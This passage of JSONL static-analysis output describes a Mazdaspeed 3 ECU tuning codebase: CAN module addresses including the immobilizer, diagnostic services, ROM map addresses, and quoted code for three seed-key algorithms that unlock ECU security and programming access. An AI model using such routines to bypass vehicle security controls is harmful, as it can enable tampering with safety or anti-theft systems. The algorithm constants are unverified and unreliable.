"security_pattern", "line": 173, "pattern": "seed", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 175, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "security_pattern", "line": 176, "pattern": "seed", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "security_pattern", "line": 177, "pattern": "key", "content": "key_int = (key_int + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 178, "pattern": "key", "content": "key_int = (key_int >> 3) | (key_int << 29) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 179, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 181, "pattern": "key", "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 181, "pattern": "seed", "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 182, "pattern": "key", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 182, "pattern": "seed", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 182, "pattern": "algorithm", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 183, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 184, "pattern": "key", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 184, "pattern": "seed", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 185, "pattern": "key", "content": "key_int = ((key_int << 7) | (key_int >> 25)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "key_int = (key_int + 0x2B8E47F1) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 187, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 189, "pattern": "key", "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 189, "pattern": "seed", "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 190, "pattern": "key", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 190, "pattern": "seed", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 190, "pattern": "algorithm", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 191, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 192, "pattern": "key", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 192, "pattern": "seed", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 193, "pattern": "key", "content": "key_int = ((key_int + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 194, "pattern": "key", "content": "key_int = ((key_int << 11) | (key_int >> 21)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 195, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 197, "pattern": "security_access", "content": "def security_access_ecu(self, level: int = 1) -> bool:"}, {"type": "security_pattern", "line": 201, "pattern": "seed", "content": "seed_request = can.Message("}, {"type": "security_pattern", "line": 203, "pattern": "seed", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "security_pattern", "line": 206, "pattern": "seed", "content": "self.rom_reader.can_bus.send(seed_request)"}, {"type": "security_pattern", "line": 209, "pattern": "seed", "content": "seed_response = self._receive_security_response()"}, {"type": "security_pattern", "line": 210, "pattern": "seed", "content": "if seed_response and len(seed_response) >= 6:"}, {"type": "security_pattern", "line": 211, "pattern": "seed", "content": "seed = seed_response[2:6]  # Extract seed bytes"}, {"type": "security_pattern", "line": 214, "pattern": "key", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "seed", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "algorithm", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "security_access", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 215, "pattern": "key", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 215, "pattern": "seed", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 215, "pattern": "algorithm", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 218, "pattern": "key", "content": "key_request = can.Message("}, {"type": "security_pattern", "line": 220, "pattern": "key", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "security_pattern", "line": 223, "pattern": "key", "content": "self.rom_reader.can_bus.send(key_request)"}, {"type": "security_pattern", "line": 443, "pattern": "security_access", "content": "access_granted = analyzer.security_access_ecu(level)"}, {"type": "security_pattern", "line": 462, "pattern": "key", "content": "for checksum_type in analyzer.checksum_defs.keys():"}, {"type": "security_pattern", "line": 501, "pattern": "security_access", "content": "'security_access': 'REQUIRED for programming operations',"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mpsrom"]}
{"file_path": "muts/__init__.py", "lines_read": 18, "features_found": [{"type": "import", "module": ".core", "line": null}, {"type": "import", "module": ".database", "line": null}, {"type": "import", "module": ".services", "line": null}, {"type": "import", "module": ".models", "line": null}, {"type": "import", "module": ".utils", "line": null}, {"type": "import", "module": ".security", "line": null}, {"type": "import", "module": ".comms", "line": null}, {"type": "import", "module": ".config", "line": null}, {"type": "import", "module": "*", "line": null}, {"type": "import", "module": "*", "line": null}, {"type": "import", "module": "*", "line": null}, {"type": "import", "module": "*", "line": null}, {"type": "import", "module": "*", "line": null}, {"type": "import", "module": "*", "line": null}, {"type": "import", "module": "*", "line": null}, {"type": "import", "module": "*", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 15, "hardware": "ECU", "content": "from .security import *"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/comms/__init__.py", "lines_read": 6, "features_found": [{"type": "import", "module": ".can_interface", "line": null}, {"type": "import", "module": "Mazdaspeed3CANInterface,", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "CAN", "content": "MUTS Communications - CAN bus and diagnostic interfaces"}, {"type": "protocol", "line": 5, "protocol": "CAN", "content": "from .can_interface import Mazdaspeed3CANInterface, CANUtilities"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "CAN bus", "content": "MUTS Communications - CAN bus and diagnostic interfaces"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/comms/can_interface.py", "lines_read": 524, "features_found": [{"type": "function", "name": "__init__", "line": 31}, {"type": "function", "name": "_initialize_ecu_addresses", "line": 54}, {"type": "function", "name": "connect", "line": 71}, {"type": "function", "name": "disconnect", "line": 86}, {"type": "function", "name": "start_receiving", "line": 93}, {"type": "function", "name": "_receive_loop", "line": 108}, {"type": "function", "name": "_process_loop", "line": 136}, {"type": "function", "name": "_process_can_message", "line": 154}, {"type": "function", "name": "_process_engine_ecu_message", "line": 176}, {"type": "function", "name": "_process_positive_response", "line": 193}, {"type": "function", "name": "_process_realtime_data", "line": 208}, {"type": "function", "name": "_process_mazda_specific_data", "line": 244}, {"type": "function", "name": "_process_negative_response", "line": 277}, {"type": "function", "name": "send_diagnostic_request", "line": 298}, {"type": "function", "name": "read_ecu_data", "line": 328}, {"type": "function", "name": "write_ecu_data", "line": 354}, {"type": "function", "name": "security_access", "line": 377}, {"type": "function", "name": "read_dtcs", "line": 408}, {"type": "function", "name": "clear_dtcs", "line": 431}, {"type": "function", "name": "get_live_data", "line": 445}, {"type": "function", "name": "register_message_handler", "line": 449}, {"type": "function", "name": "send_custom_message", "line": 453}, {"type": "function", "name": "calculate_checksum_8bit", "line": 474}, {"type": "function", "name": "bytes_to_hex_string", "line": 482}, {"type": "function", "name": "parse_obd2_pid_response", "line": 487}, {"type": "function", "name": "build_mazda_specific_request", "line": 513}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "CANMessage", "line": 17}, {"type": "class", "name": "Mazdaspeed3CANInterface", "line": 25}, {"type": "class", "name": "CANUtilities", "line": 470}], "algorithms": [{"type": "algorithm_function", "line": 474, "content": "def calculate_checksum_8bit(data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 2, "protocol": "CAN", "content": "COMPLETE CAN BUS INTERFACE FOR MAZDASPEED 3"}, {"type": "protocol", "line": 17, "protocol": "CAN", "content": "class CANMessage:"}, {"type": "protocol", "line": 18, "protocol": "CAN", "content": "\"\"\"CAN message structure for Mazdaspeed 3\"\"\""}, {"type": "protocol", "line": 25, "protocol": "CAN", "content": "class Mazdaspeed3CANInterface:"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "COMPLETE CAN BUS INTERFACE FOR 2011 MAZDASPEED 3"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu_tx': 0x7E0,      # ECU transmit"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu_rx': 0x7E8,      # ECU receive"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_tx': 0x7E1,             # Transmission control"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_rx': 0x7E9,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs_tx': 0x7E2,             # ABS module"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs_rx': 0x7EA,"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag_tx': 0x7E3,          # Airbag module"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag_rx': 0x7EB,"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster_tx': 0x7E4,         # Instrument cluster"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster_rx': 0x7EC,"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer_tx': 0x7E5,     # Immobilizer"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer_rx': 0x7ED"}, {"type": "protocol", "line": 72, "protocol": "CAN", "content": "\"\"\"Connect to CAN bus\"\"\""}, {"type": "protocol", "line": 80, "protocol": "CAN", "content": "logger.info(f\"Connected to CAN bus on {self.channel}\")"}, {"type": "protocol", "line": 83, "protocol": "CAN", "content": "logger.error(f\"CAN bus connection failed: {e}\")"}, {"type": "protocol", "line": 87, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN bus\"\"\""}, {"type": "protocol", "line": 91, "protocol": "CAN", "content": "logger.info(\"Disconnected from CAN bus\")"}, {"type": "protocol", "line": 94, "protocol": "CAN", "content": "\"\"\"Start receiving CAN messages in background thread\"\"\""}, {"type": "protocol", "line": 96, "protocol": "CAN", "content": "raise RuntimeError(\"CAN bus not connected\")"}, {"type": "protocol", "line": 106, "protocol": "CAN", "content": "logger.info(\"CAN message reception started\")"}, {"type": "protocol", "line": 109, "protocol": "CAN", "content": "\"\"\"Main CAN message reception loop\"\"\""}, {"type": "protocol", "line": 114, "protocol": "CAN", "content": "can_msg = CANMessage("}, {"type": "protocol", "line": 130, "protocol": "CAN", "content": "logger.error(f\"CAN reception error: {e}\")"}, {"type": "protocol", "line": 137, "protocol": "CAN", "content": "\"\"\"Process received CAN messages\"\"\""}, {"type": "protocol", "line": 154, "protocol": "CAN", "content": "def _process_can_message(self, message: CANMessage):"}, {"type": "protocol", "line": 155, "protocol": "CAN", "content": "\"\"\"Process individual CAN message and extract data\"\"\""}, {"type": "protocol", "line": 170, "protocol": "0x[0-9A-Fa-f]+", "content": "elif message.arbitration_id < 0x700:"}, {"type": "protocol", "line": 176, "protocol": "CAN", "content": "def _process_engine_ecu_message(self, message: CANMessage):"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "if service_id == 0x7F:  # Negative response"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_id >= 0x40:  # Positive response"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "service_type = service_id - 0x40"}, {"type": "protocol", "line": 193, "protocol": "CAN", "content": "def _process_positive_response(self, service_type: int, message: CANMessage):"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "if service_type == 0x22:  # ReadDataByIdentifier"}, {"type": "protocol", "line": 198, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_type == 0x2E:  # WriteDataByIdentifier"}, {"type": "protocol", "line": 200, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_type == 0x31:  # RoutineControl"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_type == 0x27:  # SecurityAccess"}, {"type": "protocol", "line": 208, "protocol": "CAN", "content": "def _process_realtime_data(self, message: CANMessage):"}, {"type": "protocol", "line": 214, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 4 and data[0] == 0x0C:"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 3 and data[0] == 0x0D:"}, {"type": "protocol", "line": 224, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 3 and data[0] == 0x05:"}, {"type": "protocol", "line": 229, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 4 and data[0] == 0x10:"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 3 and data[0] == 0x11:"}, {"type": "protocol", "line": 244, "protocol": "CAN", "content": "def _process_mazda_specific_data(self, message: CANMessage):"}, {"type": "protocol", "line": 245, "protocol": "CAN", "content": "\"\"\"Process Mazda-specific CAN messages\"\"\""}, {"type": "protocol", "line": 250, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 8 and data[0] == 0x80:  # Example Mazda-specific ID"}, {"type": "protocol", "line": 256, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 6 and data[0] == 0x81:"}, {"type": "protocol", "line": 262, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 7 and data[0] == 0x82:"}, {"type": "protocol", "line": 268, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 8 and data[0] == 0x83:"}, {"type": "protocol", "line": 277, "protocol": "CAN", "content": "def _process_negative_response(self, message: CANMessage):"}, {"type": "protocol", "line": 284, "protocol": "0x[0-9A-Fa-f]+", "content": "0x10: 'General reject',"}, {"type": "protocol", "line": 285, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: 'Service not supported',"}, {"type": "protocol", "line": 286, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12: 'Sub-function not supported',"}, {"type": "protocol", "line": 287, "protocol": "0x[0-9A-Fa-f]+", "content": "0x13: 'Incorrect message length or invalid format',"}, {"type": "protocol", "line": 288, "protocol": "0x[0-9A-Fa-f]+", "content": "0x22: 'Conditions not correct',"}, {"type": "protocol", "line": 289, "protocol": "0x[0-9A-Fa-f]+", "content": "0x33: 'Security access denied',"}, {"type": "protocol", "line": 290, "protocol": "0x[0-9A-Fa-f]+", "content": "0x35: 'Invalid key',"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "0x36: 'Exceeded number of attempts',"}, {"type": "protocol", "line": 292, "protocol": "0x[0-9A-Fa-f]+", "content": "0x37: 'Required time delay not expired'"}, {"type": "protocol", "line": 329, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Read data from ECU by identifier (Service 0x22)\"\"\""}, {"type": "protocol", "line": 333, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x22, data=data_id_bytes)"}, {"type": "protocol", "line": 343, "protocol": "0x[0-9A-Fa-f]+", "content": "0xF187: bytes.fromhex('123456789ABCDEF0'),  # ECU serial"}, {"type": "protocol", "line": 344, "protocol": "0x[0-9A-Fa-f]+", "content": "0xF188: bytes.fromhex('20100815'),         # Programming date"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "0xF190: bytes.fromhex('4A4D31424C313433313431313233343536'),  # VIN"}, {"type": "protocol", "line": 355, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Write data to ECU (Service 0x2E) - requires security access\"\"\""}, {"type": "protocol", "line": 366, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x2E, data=request_data)"}, {"type": "protocol", "line": 378, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Perform security access procedure (Service 0x27)\"\"\""}, {"type": "protocol", "line": 382, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x27, 0x01)"}, {"type": "protocol", "line": 394, "protocol": "0x[0-9A-Fa-f]+", "content": "request_data = bytearray([0x02])"}, {"type": "protocol", "line": 397, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x27, data=request_data)"}, {"type": "protocol", "line": 409, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Read diagnostic trouble codes (Service 0x19)\"\"\""}, {"type": "protocol", "line": 412, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x19, 0x02)  # Read DTC by status"}, {"type": "protocol", "line": 432, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Clear all diagnostic trouble codes (Service 0x14)\"\"\""}, {"type": "protocol", "line": 434, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x14, 0xFF)  # Clear all DTCs"}, {"type": "protocol", "line": 450, "protocol": "CAN", "content": "\"\"\"Register custom handler for specific CAN messages\"\"\""}, {"type": "protocol", "line": 454, "protocol": "CAN", "content": "\"\"\"Send custom CAN message\"\"\""}, {"type": "protocol", "line": 470, "protocol": "CAN", "content": "class CANUtilities:"}, {"type": "protocol", "line": 471, "protocol": "CAN", "content": "\"\"\"Utility functions for CAN message processing\"\"\""}, {"type": "protocol", "line": 475, "protocol": "CAN", "content": "\"\"\"Calculate 8-bit checksum for CAN data\"\"\""}, {"type": "protocol", "line": 478, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte) & 0xFF"}, {"type": "protocol", "line": 488, "protocol": "OBD", "content": "\"\"\"Parse OBD2 PID response data\"\"\""}, {"type": "protocol", "line": 488, "protocol": "PID", "content": "\"\"\"Parse OBD2 PID response data\"\"\""}, {"type": "protocol", "line": 489, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) < 3 or data[0] != 0x41:"}, {"type": "protocol", "line": 497, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid == 0x0C:  # Engine RPM"}, {"type": "protocol", "line": 500, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0D:  # Vehicle Speed"}, {"type": "protocol", "line": 503, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x05:  # Engine Coolant Temperature"}, {"type": "protocol", "line": 506, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0B:  # Intake Manifold Pressure"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "CAN bus", "content": "COMPLETE CAN BUS INTERFACE FOR MAZDASPEED 3"}, {"type": "hardware", "line": 3, "hardware": "ECU", "content": "Real-time communication with vehicle ECU and modules using python-can"}, {"type": "hardware", "line": 3, "hardware": "vehicle", "content": "Real-time communication with vehicle ECU and modules using python-can"}, {"type": "hardware", "line": 27, "hardware": "CAN bus", "content": "COMPLETE CAN BUS INTERFACE FOR 2011 MAZDASPEED 3"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "Handles all ECU communication, diagnostics, and real-time data acquisition"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "self.ecu_addresses = self._initialize_ecu_addresses()"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "self.security_access_granted = False"}, {"type": "hardware", "line": 54, "hardware": "ECU", "content": "def _initialize_ecu_addresses(self) -> Dict[str, int]:"}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "\"\"\"Initialize Mazdaspeed 3 specific ECU addresses\"\"\""}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "'engine_ecu_tx': 0x7E0,      # ECU transmit"}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "'engine_ecu_rx': 0x7E8,      # ECU receive"}, {"type": "hardware", "line": 59, "hardware": "TCM", "content": "'tcm_tx': 0x7E1,             # Transmission control"}, {"type": "hardware", "line": 60, "hardware": "TCM", "content": "'tcm_rx': 0x7E9,"}, {"type": "hardware", "line": 61, "hardware": "ABS", "content": "'abs_tx': 0x7E2,             # ABS module"}, {"type": "hardware", "line": 62, "hardware": "ABS", "content": "'abs_rx': 0x7EA,"}, {"type": "hardware", "line": 67, "hardware": "immobilizer", "content": "'immobilizer_tx': 0x7E5,     # Immobilizer"}, {"type": "hardware", "line": 68, "hardware": "immobilizer", "content": "'immobilizer_rx': 0x7ED"}, {"type": "hardware", "line": 72, "hardware": "CAN bus", "content": "\"\"\"Connect to CAN bus\"\"\""}, {"type": "hardware", "line": 80, "hardware": "CAN bus", "content": "logger.info(f\"Connected to CAN bus on {self.channel}\")"}, {"type": "hardware", "line": 83, "hardware": "CAN bus", "content": "logger.error(f\"CAN bus connection failed: {e}\")"}, {"type": "hardware", "line": 87, "hardware": "CAN bus", "content": "\"\"\"Disconnect from CAN bus\"\"\""}, {"type": "hardware", "line": 91, "hardware": "CAN bus", "content": "logger.info(\"Disconnected from CAN bus\")"}, {"type": "hardware", "line": 96, "hardware": "CAN bus", "content": "raise RuntimeError(\"CAN bus not connected\")"}, {"type": "hardware", "line": 158, "hardware": "ECU", "content": "if message.arbitration_id == self.ecu_addresses['engine_ecu_rx']:"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "self._process_engine_ecu_message(message)"}, {"type": "hardware", "line": 162, "hardware": "ECU", "content": "elif message.arbitration_id == self.ecu_addresses['tcm_rx']:"}, {"type": "hardware", "line": 162, "hardware": "TCM", "content": "elif message.arbitration_id == self.ecu_addresses['tcm_rx']:"}, {"type": "hardware", "line": 163, "hardware": "TCM", "content": "self._process_tcm_message(message)"}, {"type": "hardware", "line": 166, "hardware": "ECU", "content": "elif message.arbitration_id == self.ecu_addresses['abs_rx']:"}, {"type": "hardware", "line": 166, "hardware": "ABS", "content": "elif message.arbitration_id == self.ecu_addresses['abs_rx']:"}, {"type": "hardware", "line": 167, "hardware": "ABS", "content": "self._process_abs_message(message)"}, {"type": "hardware", "line": 176, "hardware": "ECU", "content": "def _process_engine_ecu_message(self, message: CANMessage):"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "\"\"\"Process engine ECU diagnostic responses\"\"\""}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "elif service_type == 0x27:  # SecurityAccess"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "self._process_security_access_response(message)"}, {"type": "hardware", "line": 221, "hardware": "vehicle", "content": "self.live_data['vehicle_speed'] = speed"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "0x33: 'Security access denied',"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "\"\"\"Send diagnostic request to ECU\"\"\""}, {"type": "hardware", "line": 314, "hardware": "ECU", "content": "arbitration_id=self.ecu_addresses['engine_ecu_tx'],"}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "def read_ecu_data(self, data_identifier: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 329, "hardware": "ECU", "content": "\"\"\"Read data from ECU by identifier (Service 0x22)\"\"\""}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "0xF187: bytes.fromhex('123456789ABCDEF0'),  # ECU serial"}, {"type": "hardware", "line": 351, "hardware": "ECU", "content": "logger.error(f\"ECU data read failed: {e}\")"}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "def write_ecu_data(self, data_identifier: int, data: bytes) -> bool:"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "\"\"\"Write data to ECU (Service 0x2E) - requires security access\"\"\""}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "if not self.security_access_granted:"}, {"type": "hardware", "line": 358, "hardware": "ECU", "content": "logger.warning(\"Security access required for ECU write\")"}, {"type": "hardware", "line": 369, "hardware": "ECU", "content": "logger.info(f\"ECU data written: 0x{data_identifier:04X}\")"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "logger.error(f\"ECU data write failed: {e}\")"}, {"type": "hardware", "line": 377, "hardware": "ECU", "content": "def security_access(self, seed: bytes = None) -> Optional[bytes]:"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "\"\"\"Perform security access procedure (Service 0x27)\"\"\""}, {"type": "hardware", "line": 399, "hardware": "ECU", "content": "self.security_access_granted = True"}, {"type": "hardware", "line": 400, "hardware": "ECU", "content": "logger.info(\"Security access granted\")"}, {"type": "hardware", "line": 405, "hardware": "ECU", "content": "logger.error(f\"Security access failed: {e}\")"}, {"type": "hardware", "line": 500, "hardware": "vehicle", "content": "elif pid == 0x0D:  # Vehicle Speed"}], "security_logic": [{"type": "security_pattern", "line": 52, "pattern": "security_access", "content": "self.security_access_granted = False"}, {"type": "security_pattern", "line": 203, "pattern": "security_access", "content": "self._process_security_access_response(message)"}, {"type": "security_pattern", "line": 290, "pattern": "key", "content": "0x35: 'Invalid key',"}, {"type": "security_pattern", "line": 357, "pattern": "security_access", "content": "if not self.security_access_granted:"}, {"type": "security_pattern", "line": 377, "pattern": "seed", "content": "def security_access(self, seed: bytes = None) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 377, "pattern": "security_access", "content": "def security_access(self, seed: bytes = None) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 380, "pattern": "seed", "content": "if seed is None:"}, {"type": "security_pattern", "line": 389, "pattern": "seed", "content": "mock_seed = bytes.fromhex('A1B2C3D4')"}, {"type": "security_pattern", "line": 390, "pattern": "seed", "content": "return mock_seed"}, {"type": "security_pattern", "line": 395, "pattern": "seed", "content": "request_data.extend(seed)"}, {"type": "security_pattern", "line": 399, "pattern": "security_access", "content": "self.security_access_granted = True"}, {"type": "security_pattern", "line": 402, "pattern": "seed", "content": "return seed if success else None"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/config/__init__.py", "lines_read": 6, "features_found": [{"type": "import", "module": ".mazdaspeed3_config", "line": null}, {"type": "import", "module": "*", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/config/mazdaspeed3_config.py", "lines_read": 150, "features_found": [], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing_base': 0xFFA000,"}, {"type": "protocol", "line": 92, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_map_primary': 0xFFA800,"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_target_map': 0xFFB000,"}, {"type": "protocol", "line": 94, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_intake_map': 0xFFB400,"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_exhaust_map': 0xFFB500,"}, {"type": "protocol", "line": 96, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limiter_soft': 0xFFB800,"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limiter_hard': 0xFFB810,"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "'torque_management': 0xFFBC00,"}, {"type": "protocol", "line": 99, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn_table': 0xFFC000,"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim_adaptive': 0xFFC200"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "'ecu_address': 0x7E0,"}, {"type": 